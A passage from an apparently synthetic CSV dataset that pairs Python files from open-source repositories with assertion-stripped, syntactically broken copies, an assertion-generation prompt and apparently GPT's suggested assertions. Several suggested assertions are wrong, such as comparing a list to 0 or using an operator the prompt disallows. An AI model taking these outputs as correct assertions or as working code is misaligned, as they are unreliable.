repo_name,content,unasserted,assertions,asserted_lines,parsed_lines,arr,atl,variables,num_vars,prompt,prompt_len,gpt
Panos512/inspire-next,"# -*- coding: utf-8 -*-
#
# This file is part of INSPIRE.
# Copyright (C) 2016 CERN.
#
# INSPIRE is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# INSPIRE is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with INSPIRE. If not, see <http://www.gnu.org/licenses/>.
#
# In applying this licence, CERN does not waive the privileges and immunities
# granted to it by virtue of its status as an Intergovernmental Organization
# or submit itself to any jurisdiction.

from inspirehep.dojson.utils import force_force_list


def test_force_force_list_returns_empty_list_on_none():
    expected = []
    result = force_force_list(None)

    assert expected == result


def test_force_force_list_wraps_strings_in_a_list():
    expected = ['foo']
    result = force_force_list('foo')

    assert expected == result


def test_force_force_list_converts_tuples_to_lists():
    expected = ['foo', 'bar', 'baz']
    result = force_force_list(('foo', 'bar', 'baz'))

    assert expected == result
","
1# -*- coding: utf-8 -*-
2#
3# This file is part of INSPIRE.
4# Copyright (C) 2016 CERN.
5#
6# INSPIRE is free software: you can redistribute it and/or modify
7# it under the terms of the GNU General Public License as published by
8# the Free Software Foundation, either version 3 of the License, or
9# (at your option) any later version.
10#
11# INSPIRE is distributed in the hope that it will be useful,
12# but WITHOUT ANY WARRANTY; without even the implied warranty of
13# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
14# GNU General Public License for more details.
15#
16# You should have received a copy of the GNU General Public License
17# along with INSPIRE. If not, see <http://www.gnu.org/licenses/>.
18#
19# In applying this licence, CERN does not waive the privileges and immunities
20# granted to it by virtue of its status as an Intergovernmental Organization
21# or submit itself to any jurisdiction.
22
23from inspirehep.dojson.utils import force_force_list
24
25
26def test_force_force_list_returns_empty_list_on_none():
27    expected = []
28    result = force_force_list(None)
29
30
31
32def test_force_force_list_wraps_strings_in_a_list():
33    expected = ['foo']
34    result = force_force_list('foo')
35
36
37
38def test_force_force_list_converts_tuples_to_lists():
39    expected = ['foo', 'bar', 'baz']
40    result = force_force_list(('foo', 'bar', 'baz'))
41
42","[['expected', '==', 'result'], ['expected', '==', 'result'], ['expected', '==', 'result']]",3,3,1.0,0.0021097046413502,"['expected', 'result']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['expected', 'result']
*Code:

1# -*- coding: utf-8 -*-
2#
3# This file is part of INSPIRE.
4# Copyright (C) 2016 CERN.
5#
6# INSPIRE is free software: you can redistribute it and/or modify
7# it under the terms of the GNU General Public License as published by
8# the Free Software Foundation, either version 3 of the License, or
9# (at your option) any later version.
10#
11# INSPIRE is distributed in the hope that it will be useful,
12# but WITHOUT ANY WARRANTY; without even the implied warranty of
13# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
14# GNU General Public License for more details.
15#
16# You should have received a copy of the GNU General Public License
17# along with INSPIRE. If not, see <http://www.gnu.org/licenses/>.
18#
19# In applying this licence, CERN does not waive the privileges and immunities
20# granted to it by virtue of its status as an Intergovernmental Organization
21# or submit itself to any jurisdiction.
22
23from inspirehep.dojson.utils import force_force_list
24
25
26def test_force_force_list_returns_empty_list_on_none():
27    expected = []
28    result = force_force_list(None)
29
30
31
32def test_force_force_list_wraps_strings_in_a_list():
33    expected = ['foo']
34    result = force_force_list('foo')
35
36
37
38def test_force_force_list_converts_tuples_to_lists():
39    expected = ['foo', 'bar', 'baz']
40    result = force_force_list(('foo', 'bar', 'baz'))
41
42",2810,"[[27, 'expected', '==', 0, ""Empty list is expected when the input is None""],
[28, 'result', '==', 0, ""Ensure force_force_list returns empty list on None input""],
[33, 'expected', '==', 1, ""List of size 1 is expected when the input is a single string""],
[34, 'result', '==', 1, ""Ensure force_force_list wraps single string in a list""],
[39, 'expected', '>=', 1, ""List of size >=1 is expected when the input is a tuple""],
[40, 'result', '>=', 1, ""Ensure force_force_list can convert a tuple into a list of size >=1""]]"
sg00dwin/origin,"#!/usr/bin/env python

# Implement DNS inclusion proof checking, see [TBD].
#
# Unfortunately, getting at the SCTs in general is hard in Python, so this
# does not start with an SSL connection, but instead fetches a log entry by
# index and then verifies the proof over DNS.

# You will need to install DNSPython (http://www.dnspython.org/)

import base64
import dns.resolver
import hashlib
import json
import logging
import os
import sys
import urllib2

basepath = os.path.dirname(sys.argv[0])
sys.path.append(os.path.join(basepath, '../../../python'))
from ct.crypto import merkle, verify
from ct.proto import client_pb2

class CTDNSLookup:
    def __init__(self, domain, verifier, resolver=None):
        self.verifier = verifier
        self.domain = domain
        self.resolver = resolver
        if not self.resolver:
            self.resolver = dns.resolver.get_default_resolver()

    def Get(self, name):
        logging.info('get %s', name)
        answers = self.resolver.query(name, 'TXT')
        assert answers.rdtype == dns.rdatatype.TXT
        return answers

    def GetOne(self, name):
        name += '.%s' % self.domain
        answers = self.Get(name)
        assert len(answers) == 1
        txt = answers[0]
        assert len(txt.strings) == 1
        return txt.strings[0]

    def GetSTH(self):
        sth_str = self.GetOne('sth')
        sth = client_pb2.SthResponse()
        parts = str(sth_str).split('.')
        sth.tree_size = int(parts[0])
        sth.timestamp = int(parts[1])
        sth.sha256_root_hash = base64.b64decode(parts[2])
        sth.tree_head_signature = base64.b64decode(parts[3])

        self.verifier.verify_sth(sth)

        return sth

    def GetEntry(self, level, index, size):
        return self.GetOne('%d.%d.%d.tree' % (level, index, size))

    def GetIndexFromHash(self, hash):
        return self.GetOne('%s.hash' % base64.b32encode(hash).rstrip('='))

if __name__ == '__main__':
    logging.basicConfig(level='INFO')

    index = sys.argv[1]

    keypem = ('-----BEGIN PUBLIC KEY-----\n'
              'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEfahLEimAoz2t01p\n'
              '3uMziiLOl/fHTDM0YDOhBRuiBARsV4UvxG2LdNgoIGLrtCzWE0J\n'
              '5APC2em4JlvR8EEEFMoA==\n'
              '-----END PUBLIC KEY-----\n')
    logurl = 'http://ct.googleapis.com/pilot';
    logdns = 'pilot.ct.googleapis.com'

    response = urllib2.urlopen('%s/ct/v1/get-entries?start=%s&end=%s'
                               %  (logurl, index, index))
    j = response.read()
    j = json.loads(j)
    leaf_input = j['entries'][0]['leaf_input']
    logging.info('leaf = %s', leaf_input)
    leaf = base64.b64decode(leaf_input)
    leaf_hash = hashlib.sha256(chr(0) + leaf).digest()

    keyinfo = client_pb2.KeyInfo()
    keyinfo.type = keyinfo.ECDSA
    keyinfo.pem_key =  keypem
    log_verifier = verify.LogVerifier(keyinfo)

    lookup = CTDNSLookup(logdns, log_verifier)
    sth = lookup.GetSTH()
    logging.info('sth = %s', sth)

    logging.info('hash = %s', base64.b64encode(leaf_hash))
    verifier = merkle.MerkleVerifier()
    index = int(index)
    audit_path = []
    prev = None
    apl = verifier.audit_path_length(index, sth.tree_size)
    for level in range(0, apl):
        h = lookup.GetEntry(level, index, sth.tree_size)
        logging.info('hash = %s', base64.b64encode(h))
        audit_path.append(h[:32])

        if prev:
            if level < apl - 6:
                assert prev[32:] == h[:-32]
            else:
                assert prev[32:] == h
        else:
            assert len(h) == 32 * min(7, apl)

        prev = h

    logging.info('path = %s', map(base64.b64encode, audit_path))

    assert verifier.verify_leaf_hash_inclusion(leaf_hash, index, audit_path,
                                               sth)

    hash_info = lookup.GetIndexFromHash(leaf_hash)
    assert hash_info == str(index)
","
1#!/usr/bin/env python
2
3# Implement DNS inclusion proof checking, see [TBD].
4#
5# Unfortunately, getting at the SCTs in general is hard in Python, so this
6# does not start with an SSL connection, but instead fetches a log entry by
7# index and then verifies the proof over DNS.
8
9# You will need to install DNSPython (http://www.dnspython.org/)
10
11import base64
12import dns.resolver
13import hashlib
14import json
15import logging
16import os
17import sys
18import urllib2
19
20basepath = os.path.dirname(sys.argv[0])
21sys.path.append(os.path.join(basepath, '../../../python'))
22from ct.crypto import merkle, verify
23from ct.proto import client_pb2
24
25class CTDNSLookup:
26    def __init__(self, domain, verifier, resolver=None):
27        self.verifier = verifier
28        self.domain = domain
29        self.resolver = resolver
30        if not self.resolver:
31            self.resolver = dns.resolver.get_default_resolver()
32
33    def Get(self, name):
34        logging.info('get %s', name)
35        answers = self.resolver.query(name, 'TXT')
36        return answers
37
38    def GetOne(self, name):
39        name += '.%s' % self.domain
40        answers = self.Get(name)
41        txt = answers[0]
42        return txt.strings[0]
43
44    def GetSTH(self):
45        sth_str = self.GetOne('sth')
46        sth = client_pb2.SthResponse()
47        parts = str(sth_str).split('.')
48        sth.tree_size = int(parts[0])
49        sth.timestamp = int(parts[1])
50        sth.sha256_root_hash = base64.b64decode(parts[2])
51        sth.tree_head_signature = base64.b64decode(parts[3])
52
53        self.verifier.verify_sth(sth)
54
55        return sth
56
57    def GetEntry(self, level, index, size):
58        return self.GetOne('%d.%d.%d.tree' % (level, index, size))
59
60    def GetIndexFromHash(self, hash):
61        return self.GetOne('%s.hash' % base64.b32encode(hash).rstrip('='))
62
63if __name__ == '__main__':
64    logging.basicConfig(level='INFO')
65
66    index = sys.argv[1]
67
68    keypem = ('-----BEGIN PUBLIC KEY-----\n'
69              'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEfahLEimAoz2t01p\n'
70              '3uMziiLOl/fHTDM0YDOhBRuiBARsV4UvxG2LdNgoIGLrtCzWE0J\n'
71              '5APC2em4JlvR8EEEFMoA==\n'
72              '-----END PUBLIC KEY-----\n')
73    logurl = 'http://ct.googleapis.com/pilot';
74    logdns = 'pilot.ct.googleapis.com'
75
76    response = urllib2.urlopen('%s/ct/v1/get-entries?start=%s&end=%s'
77                               %  (logurl, index, index))
78    j = response.read()
79    j = json.loads(j)
80    leaf_input = j['entries'][0]['leaf_input']
81    logging.info('leaf = %s', leaf_input)
82    leaf = base64.b64decode(leaf_input)
83    leaf_hash = hashlib.sha256(chr(0) + leaf).digest()
84
85    keyinfo = client_pb2.KeyInfo()
86    keyinfo.type = keyinfo.ECDSA
87    keyinfo.pem_key =  keypem
88    log_verifier = verify.LogVerifier(keyinfo)
89
90    lookup = CTDNSLookup(logdns, log_verifier)
91    sth = lookup.GetSTH()
92    logging.info('sth = %s', sth)
93
94    logging.info('hash = %s', base64.b64encode(leaf_hash))
95    verifier = merkle.MerkleVerifier()
96    index = int(index)
97    audit_path = []
98    prev = None
99    apl = verifier.audit_path_length(index, sth.tree_size)
100    for level in range(0, apl):
101        h = lookup.GetEntry(level, index, sth.tree_size)
102        logging.info('hash = %s', base64.b64encode(h))
103        audit_path.append(h[:32])
104
105        if prev:
106            if level < apl - 6:
107            else:
108        else:
109
110        prev = h
111
112    logging.info('path = %s', map(base64.b64encode, audit_path))
113
114                                               sth)
115
116    hash_info = lookup.GetIndexFromHash(leaf_hash)
117","[['answers.rdtype', '==', 'dns.rdatatype.TXT'], ['len(answers)', '==', '1'], ['len(txt.strings)', '==', '1'], ['prev[32:]', '==', 'h[:-32]'], ['prev[32:]', '==', 'h'], ['len(h)', '==', '32 * min(7'], ['verifier.verify_leaf_hash_inclusion(leaf_hash', '==', 'True'], ['hash_info', '==', 'str(index)']]",8,8,1.0,0.002058672156459,"['basepath', 'domain', 'verifier', 'resolver', 'self.verifier', 'self.domain', 'self.resolver', 'name', 'answers', 'txt', 'sth_str', 'sth', 'parts', 'sth.tree_size', 'sth.timestamp', 'sth.sha256_root_hash', 'sth.tree_head_signature', 'level', 'index', 'size', 'hash', 'keypem', 'logurl', 'logdns', 'response', 'j', 'leaf_input', ""logging.info('leaf"", 'leaf', 'leaf_hash', 'keyinfo', 'keyinfo.type', 'keyinfo.pem_key', 'log_verifier', 'lookup', ""logging.info('sth"", ""logging.info('hash"", 'audit_path', 'prev', 'apl', 'h', ""logging.info('path"", 'hash_info']",43,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['basepath', 'domain', 'verifier', 'resolver', 'self.verifier', 'self.domain', 'self.resolver', 'name', 'answers', 'txt', 'sth_str', 'sth', 'parts', 'sth.tree_size', 'sth.timestamp', 'sth.sha256_root_hash', 'sth.tree_head_signature', 'level', 'index', 'size', 'hash', 'keypem', 'logurl', 'logdns', 'response', 'j', 'leaf_input', ""logging.info('leaf"", 'leaf', 'leaf_hash', 'keyinfo', 'keyinfo.type', 'keyinfo.pem_key', 'log_verifier', 'lookup', ""logging.info('sth"", ""logging.info('hash"", 'audit_path', 'prev', 'apl', 'h', ""logging.info('path"", 'hash_info']
*Code:

1#!/usr/bin/env python
2
3# Implement DNS inclusion proof checking, see [TBD].
4#
5# Unfortunately, getting at the SCTs in general is hard in Python, so this
6# does not start with an SSL connection, but instead fetches a log entry by
7# index and then verifies the proof over DNS.
8
9# You will need to install DNSPython (http://www.dnspython.org/)
10
11import base64
12import dns.resolver
13import hashlib
14import json
15import logging
16import os
17import sys
18import urllib2
19
20basepath = os.path.dirname(sys.argv[0])
21sys.path.append(os.path.join(basepath, '../../../python'))
22from ct.crypto import merkle, verify
23from ct.proto import client_pb2
24
25class CTDNSLookup:
26    def __init__(self, domain, verifier, resolver=None):
27        self.verifier = verifier
28        self.domain = domain
29        self.resolver = resolver
30        if not self.resolver:
31            self.resolver = dns.resolver.get_default_resolver()
32
33    def Get(self, name):
34        logging.info('get %s', name)
35        answers = self.resolver.query(name, 'TXT')
36        return answers
37
38    def GetOne(self, name):
39        name += '.%s' % self.domain
40        answers = self.Get(name)
41        txt = answers[0]
42        return txt.strings[0]
43
44    def GetSTH(self):
45        sth_str = self.GetOne('sth')
46        sth = client_pb2.SthResponse()
47        parts = str(sth_str).split('.')
48        sth.tree_size = int(parts[0])
49        sth.timestamp = int(parts[1])
50        sth.sha256_root_hash = base64.b64decode(parts[2])
51        sth.tree_head_signature = base64.b64decode(parts[3])
52
53        self.verifier.verify_sth(sth)
54
55        return sth
56
57    def GetEntry(self, level, index, size):
58        return self.GetOne('%d.%d.%d.tree' % (level, index, size))
59
60    def GetIndexFromHash(self, hash):
61        return self.GetOne('%s.hash' % base64.b32encode(hash).rstrip('='))
62
63if __name__ == '__main__':
64    logging.basicConfig(level='INFO')
65
66    index = sys.argv[1]
67
68    keypem = ('-----BEGIN PUBLIC KEY-----\n'
69              'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEfahLEimAoz2t01p\n'
70              '3uMziiLOl/fHTDM0YDOhBRuiBARsV4UvxG2LdNgoIGLrtCzWE0J\n'
71              '5APC2em4JlvR8EEEFMoA==\n'
72              '-----END PUBLIC KEY-----\n')
73    logurl = 'http://ct.googleapis.com/pilot';
74    logdns = 'pilot.ct.googleapis.com'
75
76    response = urllib2.urlopen('%s/ct/v1/get-entries?start=%s&end=%s'
77                               %  (logurl, index, index))
78    j = response.read()
79    j = json.loads(j)
80    leaf_input = j['entries'][0]['leaf_input']
81    logging.info('leaf = %s', leaf_input)
82    leaf = base64.b64decode(leaf_input)
83    leaf_hash = hashlib.sha256(chr(0) + leaf).digest()
84
85    keyinfo = client_pb2.KeyInfo()
86    keyinfo.type = keyinfo.ECDSA
87    keyinfo.pem_key =  keypem
88    log_verifier = verify.LogVerifier(keyinfo)
89
90    lookup = CTDNSLookup(logdns, log_verifier)
91    sth = lookup.GetSTH()
92    logging.info('sth = %s', sth)
93
94    logging.info('hash = %s', base64.b64encode(leaf_hash))
95    verifier = merkle.MerkleVerifier()
96    index = int(index)
97    audit_path = []
98    prev = None
99    apl = verifier.audit_path_length(index, sth.tree_size)
100    for level in range(0, apl):
101        h = lookup.GetEntry(level, index, sth.tree_size)
102        logging.info('hash = %s', base64.b64encode(h))
103        audit_path.append(h[:32])
104
105        if prev:
106            if level < apl - 6:
107            else:
108        else:
109
110        prev = h
111
112    logging.info('path = %s', map(base64.b64encode, audit_path))
113
114                                               sth)
115
116    hash_info = lookup.GetIndexFromHash(leaf_hash)
117",5704,"[[26, 'domain', '!=', None, ""domain must be provided for initialization""],
 [26, 'verifier', '!=', None, ""verifier must be provided for initialization""],
 [31, 'self.resolver', '!=', None, ""A resolver is needed for DNS query""],
 [34, 'name', '!=', None, ""Get function must be provided a name for successful querying""],
 [39, 'name', '!=', None, ""GetOne function must be provided a name for successful querying""],
 [47, 'sth_str', '!=', None, ""STH should return a non-empty information string""],
 [48, 'sth.tree_size', '>=', 0, ""Tree size must be non-negative""],
 [49, 'sth.timestamp', '>=', 0, ""Timestamp must be non-negative""],
 [57, 'level', '>=', 0, ""Tree level must be non-negative""],
 [57, 'index', '>=', 0, ""Tree index must be non-negative""],
 [57, 'size', '>=', 0, ""Tree size must be non-negative""],
 [60, 'hash', '!=', None, ""To get index from hash, hash must be non-empty and initialized""],
 [66, 'index', '>=', 0, ""To fetch log entry by index, index must be non-negative""],
 [88, 'keyinfo', '!=', None, ""Keyinfo must be successfully initialized in order for LogVerifier to be created""],
 [91, 'sth', '!=', None, ""GetSTH function must return a non-None object""],
 [96, 'index', '>=', 0, ""Index for merkle verifier must be non-negative""],
 [97, 'audit_path', '!=', None, ""Audit_path must be initialized to an empty list""],
 [99, 'apl', '>=', 0, ""Audit path length provided by merkle verifier must be non-negative""],
 [100, 'level', '<', 'apl', ""Level must be less than audit path length""],
 [101, 'h', '!=', None, ""Lookup's GetEntry must not return None""]]"
KatiRG/flyingpigeon,"from .common import WpsTestClient, TESTDATA, assert_response_success


def test_plotlibs():
    import matplotlib
    matplotlib.use('Agg')   # use this if no xserver is available
    from matplotlib import pyplot as plt
    from matplotlib.colors import Normalize
    from cartopy import config as cartopy_config
    from cartopy.util import add_cyclic_point
    import cartopy.crs as ccrs
    from cartopy.io.shapereader import Reader
    from cartopy.feature import ShapelyFeature
    from PyPDF2 import PdfFileWriter, PdfFileReader
    from reportlab.pdfgen import canvas
    from flyingpigeon import config
    DIR_SHP = config.shapefiles_dir()


def test_polygons():
    from flyingpigeon.visualisation import plot_polygons
    from os.path import exists
    from os import remove

    png = plot_polygons(['DEU', 'ESP'])

    assert exists(png) is True
    remove(png)
","
1
2
3def test_plotlibs():
4    import matplotlib
5    matplotlib.use('Agg')   # use this if no xserver is available
6    from matplotlib import pyplot as plt
7    from matplotlib.colors import Normalize
8    from cartopy import config as cartopy_config
9    from cartopy.util import add_cyclic_point
10    import cartopy.crs as ccrs
11    from cartopy.io.shapereader import Reader
12    from cartopy.feature import ShapelyFeature
13    from PyPDF2 import PdfFileWriter, PdfFileReader
14    from reportlab.pdfgen import canvas
15    from flyingpigeon import config
16    DIR_SHP = config.shapefiles_dir()
17
18
19def test_polygons():
20    from flyingpigeon.visualisation import plot_polygons
21    from os.path import exists
22    from os import remove
23
24    png = plot_polygons(['DEU', 'ESP'])
25
26    remove(png)
27","[['exists(png)', '==', 'True']]",2,1,0.5,0.0011415525114155,"['DIR_SHP', 'png']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['DIR_SHP', 'png']
*Code:

1
2
3def test_plotlibs():
4    import matplotlib
5    matplotlib.use('Agg')   # use this if no xserver is available
6    from matplotlib import pyplot as plt
7    from matplotlib.colors import Normalize
8    from cartopy import config as cartopy_config
9    from cartopy.util import add_cyclic_point
10    import cartopy.crs as ccrs
11    from cartopy.io.shapereader import Reader
12    from cartopy.feature import ShapelyFeature
13    from PyPDF2 import PdfFileWriter, PdfFileReader
14    from reportlab.pdfgen import canvas
15    from flyingpigeon import config
16    DIR_SHP = config.shapefiles_dir()
17
18
19def test_polygons():
20    from flyingpigeon.visualisation import plot_polygons
21    from os.path import exists
22    from os import remove
23
24    png = plot_polygons(['DEU', 'ESP'])
25
26    remove(png)
27",2220,"[[16, 'DIR_SHP', '!=', '', 'assert location directory for shapefiles is not empty'],
 [24, 'png', '!=', '', 'assert plot_polygons function returns not an empty result']]"
johnraz/django-rest-framework,"from __future__ import unicode_literals

import unittest

from django.conf.urls import url
from django.db import connection, connections, transaction
from django.http import Http404
from django.test import TestCase, TransactionTestCase
from django.utils.decorators import method_decorator

from rest_framework import status
from rest_framework.exceptions import APIException
from rest_framework.response import Response
from rest_framework.test import APIRequestFactory
from rest_framework.views import APIView
from tests.models import BasicModel

factory = APIRequestFactory()


class BasicView(APIView):
    def post(self, request, *args, **kwargs):
        BasicModel.objects.create()
        return Response({'method': 'GET'})


class ErrorView(APIView):
    def post(self, request, *args, **kwargs):
        BasicModel.objects.create()
        raise Exception


class APIExceptionView(APIView):
    def post(self, request, *args, **kwargs):
        BasicModel.objects.create()
        raise APIException


@unittest.skipUnless(
    connection.features.uses_savepoints,
    ""'atomic' requires transactions and savepoints.""
)
class DBTransactionTests(TestCase):
    def setUp(self):
        self.view = BasicView.as_view()
        connections.databases['default']['ATOMIC_REQUESTS'] = True

    def tearDown(self):
        connections.databases['default']['ATOMIC_REQUESTS'] = False

    def test_no_exception_commit_transaction(self):
        request = factory.post('/')

        with self.assertNumQueries(1):
            response = self.view(request)
        self.assertFalse(transaction.get_rollback())
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        assert BasicModel.objects.count() == 1


@unittest.skipUnless(
    connection.features.uses_savepoints,
    ""'atomic' requires transactions and savepoints.""
)
class DBTransactionErrorTests(TestCase):
    def setUp(self):
        self.view = ErrorView.as_view()
        connections.databases['default']['ATOMIC_REQUESTS'] = True

    def tearDown(self):
        connections.databases['default']['ATOMIC_REQUESTS'] = False

    def test_generic_exception_delegate_transaction_management(self):
        """"""
        Transaction is eventually managed by outer-most transaction atomic
        block. DRF do not try to interfere here.

        We let django deal with the transaction when it will catch the Exception.
        """"""
        request = factory.post('/')
        with self.assertNumQueries(3):
            # 1 - begin savepoint
            # 2 - insert
            # 3 - release savepoint
            with transaction.atomic():
                self.assertRaises(Exception, self.view, request)
                self.assertFalse(transaction.get_rollback())
        assert BasicModel.objects.count() == 1


@unittest.skipUnless(
    connection.features.uses_savepoints,
    ""'atomic' requires transactions and savepoints.""
)
class DBTransactionAPIExceptionTests(TestCase):
    def setUp(self):
        self.view = APIExceptionView.as_view()
        connections.databases['default']['ATOMIC_REQUESTS'] = True

    def tearDown(self):
        connections.databases['default']['ATOMIC_REQUESTS'] = False

    def test_api_exception_rollback_transaction(self):
        """"""
        Transaction is rollbacked by our transaction atomic block.
        """"""
        request = factory.post('/')
        num_queries = (4 if getattr(connection.features,
                                    'can_release_savepoints', False) else 3)
        with self.assertNumQueries(num_queries):
            # 1 - begin savepoint
            # 2 - insert
            # 3 - rollback savepoint
            # 4 - release savepoint (django>=1.8 only)
            with transaction.atomic():
                response = self.view(request)
                self.assertTrue(transaction.get_rollback())
        self.assertEqual(response.status_code,
                         status.HTTP_500_INTERNAL_SERVER_ERROR)
        assert BasicModel.objects.count() == 0


@unittest.skipUnless(
    connection.features.uses_savepoints,
    ""'atomic' requires transactions and savepoints.""
)
class NonAtomicDBTransactionAPIExceptionTests(TransactionTestCase):
    @property
    def urls(self):
        class NonAtomicAPIExceptionView(APIView):
            @method_decorator(transaction.non_atomic_requests)
            def dispatch(self, *args, **kwargs):
                return super(NonAtomicAPIExceptionView, self).dispatch(*args, **kwargs)

            def get(self, request, *args, **kwargs):
                BasicModel.objects.all()
                raise Http404

        return (
            url(r'^$', NonAtomicAPIExceptionView.as_view()),
        )

    def setUp(self):
        connections.databases['default']['ATOMIC_REQUESTS'] = True

    def tearDown(self):
        connections.databases['default']['ATOMIC_REQUESTS'] = False

    def test_api_exception_rollback_transaction_non_atomic_view(self):
        response = self.client.get('/')

        # without checking connection.in_atomic_block view raises 500
        # due attempt to rollback without transaction
        self.assertEqual(response.status_code,
                         status.HTTP_404_NOT_FOUND)
","
1from __future__ import unicode_literals
2
3import unittest
4
5from django.conf.urls import url
6from django.db import connection, connections, transaction
7from django.http import Http404
8from django.test import TestCase, TransactionTestCase
9from django.utils.decorators import method_decorator
10
11from rest_framework import status
12from rest_framework.exceptions import APIException
13from rest_framework.response import Response
14from rest_framework.test import APIRequestFactory
15from rest_framework.views import APIView
16from tests.models import BasicModel
17
18factory = APIRequestFactory()
19
20
21class BasicView(APIView):
22    def post(self, request, *args, **kwargs):
23        BasicModel.objects.create()
24        return Response({'method': 'GET'})
25
26
27class ErrorView(APIView):
28    def post(self, request, *args, **kwargs):
29        BasicModel.objects.create()
30        raise Exception
31
32
33class APIExceptionView(APIView):
34    def post(self, request, *args, **kwargs):
35        BasicModel.objects.create()
36        raise APIException
37
38
39@unittest.skipUnless(
40    connection.features.uses_savepoints,
41    ""'atomic' requires transactions and savepoints.""
42)
43class DBTransactionTests(TestCase):
44    def setUp(self):
45        self.view = BasicView.as_view()
46        connections.databases['default']['ATOMIC_REQUESTS'] = True
47
48    def tearDown(self):
49        connections.databases['default']['ATOMIC_REQUESTS'] = False
50
51    def test_no_exception_commit_transaction(self):
52        request = factory.post('/')
53
54            response = self.view(request)
55
56
57@unittest.skipUnless(
58    connection.features.uses_savepoints,
59    ""'atomic' requires transactions and savepoints.""
60)
61class DBTransactionErrorTests(TestCase):
62    def setUp(self):
63        self.view = ErrorView.as_view()
64        connections.databases['default']['ATOMIC_REQUESTS'] = True
65
66    def tearDown(self):
67        connections.databases['default']['ATOMIC_REQUESTS'] = False
68
69    def test_generic_exception_delegate_transaction_management(self):
70        """"""
71        Transaction is eventually managed by outer-most transaction atomic
72        block. DRF do not try to interfere here.
73
74        We let django deal with the transaction when it will catch the Exception.
75        """"""
76        request = factory.post('/')
77            # 1 - begin savepoint
78            # 2 - insert
79            # 3 - release savepoint
80            with transaction.atomic():
81
82
83@unittest.skipUnless(
84    connection.features.uses_savepoints,
85    ""'atomic' requires transactions and savepoints.""
86)
87class DBTransactionAPIExceptionTests(TestCase):
88    def setUp(self):
89        self.view = APIExceptionView.as_view()
90        connections.databases['default']['ATOMIC_REQUESTS'] = True
91
92    def tearDown(self):
93        connections.databases['default']['ATOMIC_REQUESTS'] = False
94
95    def test_api_exception_rollback_transaction(self):
96        """"""
97        Transaction is rollbacked by our transaction atomic block.
98        """"""
99        request = factory.post('/')
100        num_queries = (4 if getattr(connection.features,
101                                    'can_release_savepoints', False) else 3)
102            # 1 - begin savepoint
103            # 2 - insert
104            # 3 - rollback savepoint
105            # 4 - release savepoint (django>=1.8 only)
106            with transaction.atomic():
107                response = self.view(request)
108                         status.HTTP_500_INTERNAL_SERVER_ERROR)
109
110
111@unittest.skipUnless(
112    connection.features.uses_savepoints,
113    ""'atomic' requires transactions and savepoints.""
114)
115class NonAtomicDBTransactionAPIExceptionTests(TransactionTestCase):
116    @property
117    def urls(self):
118        class NonAtomicAPIExceptionView(APIView):
119            @method_decorator(transaction.non_atomic_requests)
120            def dispatch(self, *args, **kwargs):
121                return super(NonAtomicAPIExceptionView, self).dispatch(*args, **kwargs)
122
123            def get(self, request, *args, **kwargs):
124                BasicModel.objects.all()
125                raise Http404
126
127        return (
